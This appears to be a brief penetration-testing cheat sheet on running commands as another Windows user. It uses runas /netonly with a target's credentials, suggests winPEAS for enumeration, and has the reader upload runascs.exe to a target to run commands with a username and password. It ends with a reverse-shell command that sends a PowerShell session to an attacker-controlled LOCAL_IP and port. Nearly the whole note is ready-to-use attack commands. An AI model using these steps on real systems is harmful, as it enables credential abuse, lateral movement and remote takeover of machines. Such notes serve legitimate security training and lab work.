> [!Requirements]
> Host with NetNTLMv2 authentication enabled on a host for the target user.

This command is to be able to execute commands in the context of a different user:
```
runas /netonly /user:DOMAIN_CN\USER "powershell.exe"
*enter password*
```

> [!Important]
> To enumerate if we can use the credentials of the target user, we can use `winPEASx64.exe`

If the password prompt is not interactive, upload runascs.exe to the target and execute:
```
.\runascs.exe USER PASSWORD COMMAND
```

Reverse shell:
```
.\runascs.exe USER PASSWORD powershell.exe -r LOCAL_IP:LOCAL_PORT
```